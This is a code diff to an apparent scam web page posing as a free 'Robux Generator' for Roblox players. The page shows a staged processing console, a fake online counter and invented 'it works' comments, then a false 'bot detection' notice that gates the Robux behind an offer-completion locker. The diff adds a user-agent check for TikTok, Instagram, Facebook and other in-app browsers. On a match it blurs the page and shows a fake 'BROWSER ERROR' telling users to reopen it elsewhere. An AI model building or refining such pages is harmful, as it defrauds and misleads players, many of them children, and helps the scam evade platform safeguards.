@@ -5,12 +5,17 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Robux Generator</title>
     <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700;900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root { --primary: #00b06f; --primary-dark: #009960; --dark: #191b1d; --card-bg: #2b2d31; --text: #ffffff; --gray: #b8b8b8; --border: rgba(255,255,255,0.1); }
         * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; -webkit-tap-highlight-color: transparent; }
         body { font-family: 'Montserrat', sans-serif; background-color: var(--dark); color: var(--text); min-height: 100vh; display: flex; flex-direction: column; align-items: center; overflow-x: hidden; background-image: radial-gradient(#2b2d31 1px, transparent 1px); background-size: 20px 20px; }
+        
+        /* CONTENT WRAPPER FOR BLUR EFFECT */
+        #content-wrapper { width: 100%; display: flex; flex-direction: column; align-items: center; transition: filter 0.3s ease; }
+
         .navbar { width: 100%; height: 60px; background: #232527; border-bottom: 1px solid var(--border); padding: 0 20px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 4px 10px rgba(0,0,0,0.3); position: fixed; top: 0; z-index: 100; }
         .nav-logo { font-weight: 900; font-size: 18px; letter-spacing: 0.5px; display: flex; align-items: center; gap: 8px; }
         .nav-logo img { width: 24px; filter: invert(1); }
@@ -82,64 +87,132 @@
         .offer-desc { color: #aaa; font-size: 10px; display: block; font-weight: 500; }
         .offer-btn-small { background: var(--primary); color: #fff; font-size: 10px; font-weight: 800; padding: 6px 12px; border-radius: 6px; text-transform: uppercase; }
         .modal-footer { padding: 15px; text-align: center; background: #191b1d; border-top: 1px solid var(--border); font-size: 10px; color: #555; }
+
+        /* --- TIKTOK BROWSER OVERLAY (Copied & Adjusted for this theme) --- */
+        .tiktok-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.95); z-index: 99999;
+            display: none; /* Hidden by default */
+            flex-direction: column; justify-content: center; align-items: center;
+            text-align: center; padding: 20px;
+            backdrop-filter: blur(10px);
+        }
+        .tiktok-icon { font-size: 50px; color: #fff; margin-bottom: 20px; animation: bounce 1s infinite; }
+        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-5px); } }
+        
+        .tiktok-title { 
+            color: #ff4757; 
+            font-size: 24px; 
+            margin-bottom: 15px; 
+            text-transform: uppercase; 
+            font-family: 'Montserrat', sans-serif;
+            font-weight: 900;
+            letter-spacing: 1px;
+        }
+        
+        .tiktok-desc { 
+            font-family: 'Inter', sans-serif; 
+            color: #ccc; 
+            font-size: 14px; 
+            line-height: 1.6; 
+            max-width: 320px; 
+            margin-bottom: 30px; 
+        }
+        
+        /* Arrow pointing UP-RIGHT towards the menu */
+        .tiktok-arrow { 
+            font-size: 40px; 
+            color: var(--primary); /* Matching site green */
+            animation: pointToMenu 1.5s infinite ease-in-out; 
+            position: absolute; 
+            top: 20px; 
+            right: 20px; 
+            transform: rotate(45deg); /* Points to Corner */
+        }
+        
+        @keyframes pointToMenu { 
+            0% { transform: translate(0, 0) rotate(45deg); opacity: 1; } 
+            50% { transform: translate(10px, -10px) rotate(45deg); opacity: 0.6; } 
+            100% { transform: translate(0, 0) rotate(45deg); opacity: 1; }
+        }
     </style>
 </head>
 <body>
-    <nav class="navbar">
-        <div class="nav-logo"><img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg"><span>GENERATOR</span></div>
-        <div class="user-counter"><span class="live-dot"></span> <span id="onlineCount">842</span> Online</div>
-    </nav>
-    <div class="main-container">
-        <div id="step1" class="app-card animate__animated animate__fadeIn">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/c/c7/Robux_2019_Logo_gold.svg" style="width: 60px; margin-bottom: 15px;">
-            <h2>ROBUX GENERATOR</h2>
-            <div class="subtitle">Safe. Secure. No Password Required.</div>
-            <div class="input-group"><span class="input-label">ROBLOX USERNAME</span><input type="text" id="username" class="form-input" placeholder="e.g. BuilderMan"></div>
-            <span class="input-label" style="margin-left:5px;">PLATFORM</span>
-            <div class="platform-grid">
-                <div class="platform-item active" onclick="selectPlatform(this)"><i class="fas fa-desktop"></i></div>
-                <div class="platform-item" onclick="selectPlatform(this)"><i class="fas fa-mobile-alt"></i></div>
-                <div class="platform-item" onclick="selectPlatform(this)"><i class="fab fa-xbox"></i></div>
-                <div class="platform-item" onclick="selectPlatform(this)"><i class="fas fa-tablet-alt"></i></div>
-            </div>
-            <button class="btn-main" onclick="processStep1()">Connect Account</button>
-        </div>
-        <div id="step2" class="app-card hidden-step">
-            <div class="avatar-wrapper" id="avatarCircle"><div class="pulse-ring"></div><img id="avatarImg" class="avatar-img" src="" onerror="this.src='https://api.dicebear.com/7.x/avataaars/svg?seed=roblox'"><i id="searchIcon" class="fas fa-search fa-2x" style="color:#666"></i></div>
-            <h3 id="searchStatus">Searching Database...</h3>
-        </div>
-        <div id="step3" class="app-card hidden-step">
-            <h2>Select Amount</h2>
-            <div class="subtitle">Account Connected: <span id="displayUser" style="color:var(--primary)">User</span></div>
-            <div class="robux-grid">
-                <div class="robux-card" onclick="startGen(4500)"><img src="https://upload.wikimedia.org/wikipedia/commons/c/c7/Robux_2019_Logo_gold.svg" class="robux-img"><span class="robux-amount">4,500</span></div>
-                <div class="robux-card" onclick="startGen(10000)"><div class="tag-popular">POPULAR</div><img src="https://upload.wikimedia.org/wikipedia/commons/c/c7/Robux_2019_Logo_gold.svg" class="robux-img"><span class="robux-amount">10,000</span></div>
-                <div class="robux-card" onclick="startGen(22500)"><img src="https://upload.wikimedia.org/wikipedia/commons/c/c7/Robux_2019_Logo_gold.svg" class="robux-img"><span class="robux-amount">22,500</span></div>
-                <div class="robux-card" onclick="startGen(50000)"><img src="https://upload.wikimedia.org/wikipedia/commons/c/c7/Robux_2019_Logo_gold.svg" class="robux-img"><span class="robux-amount">50,000</span></div>
-            </div>
-        </div>
-        <div id="step4" class="app-card hidden-step">
-            <h2 style="color:var(--primary);">PROCESSING</h2>
-            <div class="subtitle">Do not close this page...</div>
-            <div class="console-profile" id="consoleProfile"><img id="consoleAvatar" class="console-avatar" src=""><div class="console-info"><div style="font-weight:800; font-size:14px;" id="consoleName">User</div><div class="console-id">ID: <span id="consoleID">Loading...</span></div><div style="color:#00b06f; font-weight:bold; font-size:10px;">● ONLINE</div></div></div>
-            <div class="console-box" id="console"><div class="console-line">> Initializing...</div></div>
-            <div class="progress-container"><div class="progress-bar" id="pbar"></div></div>
-        </div>
-        <div id="step5" class="app-card hidden-step">
-            <div style="font-size: 50px; color: #ff4444; margin-bottom:15px;"><i class="fas fa-shield-alt"></i></div>
-            <h2 style="color:#ff4444;">VERIFICATION REQUIRED</h2>
-            <p style="font-size:13px; color:#ccc; margin-bottom:20px; line-height:1.5;">Automatic bot detection has flagged this transaction for <strong id="finalUser" style="color:#fff">User</strong>.<br><br>Please verify you are a human to release the <strong><span id="finalAmount"></span> Robux</strong>.</p>
-            <button class="btn-main" onclick="openCustomLocker()">VERIFY NOW</button>
-        </div>
-        <div class="comments-container">
-            <div class="comment-header">Live Feed</div>
-            <div class="comment-input-area"><input type="text" id="userCommentInput" class="comment-input" placeholder="Join the discussion..."><button class="post-btn" onclick="postComment()">POST</button></div>
-            <div id="commentsList" class="comments-list">
-                <div class="comment-item"><div class="avatar" style="background-image: url('https://api.dicebear.com/7.x/avataaars/svg?seed=Felix');"></div><div><div class="username">RobloxKing_99</div><div class="comment-text">dude i thought this was fake but i just got 4500 R$!!! TYSMM</div><div class="time">Just now</div></div></div>
-                <div class="comment-item"><div class="avatar" style="background-image: url('https://api.dicebear.com/7.x/avataaars/svg?seed=Sarah');"></div><div><div class="username">UnicornGirl22</div><div class="comment-text">It works! Make sure you actually complete the offer properly.</div><div class="time">2m ago</div></div></div>
-            </div>
-        </div>
+
+    <!-- TIKTOK/IN-APP DETECTOR OVERLAY -->
+    <div id="inAppBrowserWarning" class="tiktok-overlay">
+        <div class="tiktok-arrow"><i class="fas fa-arrow-up"></i></div>
+        <div class="tiktok-icon"><i class="fas fa-globe"></i></div>
+        <h2 class="tiktok-title">BROWSER ERROR</h2>
+        <p class="tiktok-desc">
+            This site is not compatible with the current in-app browser environment due to technical limitations.
+            <br><br>
+            1. Click the <strong style="color:#fff">•••</strong> (Three Dots) at the top right.
+            <br>
+            2. Select <strong style="color:var(--primary)">Open in Browser</strong>.
+        </p>
+        <div style="font-size:10px; color:#555; margin-top:20px; font-family:'Inter';">ERROR: ERR_WEBVIEW_RESTRICTED</div>
     </div>
+
+    <!-- WRAPPER FOR BLUR EFFECT -->
+    <div id="content-wrapper">
+        <nav class="navbar">
+            <div class="nav-logo"><img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg"><span>GENERATOR</span></div>
+            <div class="user-counter"><span class="live-dot"></span> <span id="onlineCount">842</span> Online</div>
+        </nav>
+        <div class="main-container">
+            <div id="step1" class="app-card animate__animated animate__fadeIn">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/c/c7/Robux_2019_Logo_gold.svg" style="width: 60px; margin-bottom: 15px;">
+                <h2>ROBUX GENERATOR</h2>
+                <div class="subtitle">Safe. Secure. No Password Required.</div>
+                <div class="input-group"><span class="input-label">ROBLOX USERNAME</span><input type="text" id="username" class="form-input" placeholder="e.g. BuilderMan"></div>
+                <span class="input-label" style="margin-left:5px;">PLATFORM</span>
+                <div class="platform-grid">
+                    <div class="platform-item active" onclick="selectPlatform(this)"><i class="fas fa-desktop"></i></div>
+                    <div class="platform-item" onclick="selectPlatform(this)"><i class="fas fa-mobile-alt"></i></div>
+                    <div class="platform-item" onclick="selectPlatform(this)"><i class="fab fa-xbox"></i></div>
+                    <div class="platform-item" onclick="selectPlatform(this)"><i class="fas fa-tablet-alt"></i></div>
+                </div>
+                <button class="btn-main" onclick="processStep1()">Connect Account</button>
+            </div>
+            <div id="step2" class="app-card hidden-step">
+                <div class="avatar-wrapper" id="avatarCircle"><div class="pulse-ring"></div><img id="avatarImg" class="avatar-img" src="" onerror="this.src='https://api.dicebear.com/7.x/avataaars/svg?seed=roblox'"><i id="searchIcon" class="fas fa-search fa-2x" style="color:#666"></i></div>
+                <h3 id="searchStatus">Searching Database...</h3>
+            </div>
+            <div id="step3" class="app-card hidden-step">
+                <h2>Select Amount</h2>
+                <div class="subtitle">Account Connected: <span id="displayUser" style="color:var(--primary)">User</span></div>
+                <div class="robux-grid">
+                    <div class="robux-card" onclick="startGen(4500)"><img src="https://upload.wikimedia.org/wikipedia/commons/c/c7/Robux_2019_Logo_gold.svg" class="robux-img"><span class="robux-amount">4,500</span></div>
+                    <div class="robux-card" onclick="startGen(10000)"><div class="tag-popular">POPULAR</div><img src="https://upload.wikimedia.org/wikipedia/commons/c/c7/Robux_2019_Logo_gold.svg" class="robux-img"><span class="robux-amount">10,000</span></div>
+                    <div class="robux-card" onclick="startGen(22500)"><img src="https://upload.wikimedia.org/wikipedia/commons/c/c7/Robux_2019_Logo_gold.svg" class="robux-img"><span class="robux-amount">22,500</span></div>
+                    <div class="robux-card" onclick="startGen(50000)"><img src="https://upload.wikimedia.org/wikipedia/commons/c/c7/Robux_2019_Logo_gold.svg" class="robux-img"><span class="robux-amount">50,000</span></div>
+                </div>
+            </div>
+            <div id="step4" class="app-card hidden-step">
+                <h2 style="color:var(--primary);">PROCESSING</h2>
+                <div class="subtitle">Do not close this page...</div>
+                <div class="console-profile" id="consoleProfile"><img id="consoleAvatar" class="console-avatar" src=""><div class="console-info"><div style="font-weight:800; font-size:14px;" id="consoleName">User</div><div class="console-id">ID: <span id="consoleID">Loading...</span></div><div style="color:#00b06f; font-weight:bold; font-size:10px;">● ONLINE</div></div></div>
+                <div class="console-box" id="console"><div class="console-line">> Initializing...</div></div>
+                <div class="progress-container"><div class="progress-bar" id="pbar"></div></div>
+            </div>
+            <div id="step5" class="app-card hidden-step">
+                <div style="font-size: 50px; color: #ff4444; margin-bottom:15px;"><i class="fas fa-shield-alt"></i></div>
+                <h2 style="color:#ff4444;">VERIFICATION REQUIRED</h2>
+                <p style="font-size:13px; color:#ccc; margin-bottom:20px; line-height:1.5;">Automatic bot detection has flagged this transaction for <strong id="finalUser" style="color:#fff">User</strong>.<br><br>Please verify you are a human to release the <strong><span id="finalAmount"></span> Robux</strong>.</p>
+                <button class="btn-main" onclick="openCustomLocker()">VERIFY NOW</button>
+            </div>
+            <div class="comments-container">
+                <div class="comment-header">Live Feed</div>
+                <div class="comment-input-area"><input type="text" id="userCommentInput" class="comment-input" placeholder="Join the discussion..."><button class="post-btn" onclick="postComment()">POST</button></div>
+                <div id="commentsList" class="comments-list">
+                    <div class="comment-item"><div class="avatar" style="background-image: url('https://api.dicebear.com/7.x/avataaars/svg?seed=Felix');"></div><div><div class="username">RobloxKing_99</div><div class="comment-text">dude i thought this was fake but i just got 4500 R$!!! TYSMM</div><div class="time">Just now</div></div></div>
+                    <div class="comment-item"><div class="avatar" style="background-image: url('https://api.dicebear.com/7.x/avataaars/svg?seed=Sarah');"></div><div><div class="username">UnicornGirl22</div><div class="comment-text">It works! Make sure you actually complete the offer properly.</div><div class="time">2m ago</div></div></div>
+                </div>
+            </div>
+        </div>
+    </div> <!-- END WRAPPER -->
+
     <div id="customModal" class="modal-overlay">
         <div class="modal-content">
             <div class="modal-header"><div class="modal-title">Human Verification</div><div class="modal-subtitle">Complete 1 offer to release your Robux.</div></div>
@@ -148,6 +221,27 @@
         </div>
     </div>
     <script>
+        // --- IN-APP BROWSER DETECTION LOGIC ---
+        (function() {
+            const ua = navigator.userAgent || navigator.vendor || window.opera;
+            // Detects: Instagram, FB, TikTok, Snapchat, Line, Twitter, LinkedIn
+            const isInApp = /Instagram|FBAN|FBAV|TikTok|musical_ly|Snapchat|Line|Twitter|LinkedIn/i.test(ua);
+            // Detects generic Android WebView
+            const isAndroidWebView = /wv/.test(ua) && /Android/i.test(ua); 
+
+            if (isInApp || isAndroidWebView) {
+                const overlay = document.getElementById('inAppBrowserWarning');
+                const content = document.getElementById('content-wrapper');
+                
+                if(overlay && content) {
+                    overlay.style.display = 'flex';
+                    content.style.filter = 'blur(15px)';
+                    content.style.pointerEvents = 'none'; // Disable clicking on site
+                }
+            }
+        })();
+
+        // --- EXISTING SCRIPT ---
         const OFFER_API = "/get-offers";
         const FALLBACK_OFFERS = [{name_short:"Family Island",adcopy:"Reach Level 10.",link:"#",picture:"https://placehold.co/60x60/orange/white?text=FI"},{name_short:"TikTok",adcopy:"Install and Open",link:"#",picture:"https://placehold.co/60x60/black/white?text=TT"}];
         let globalUser = "", globalAvatar = "", globalID = "";
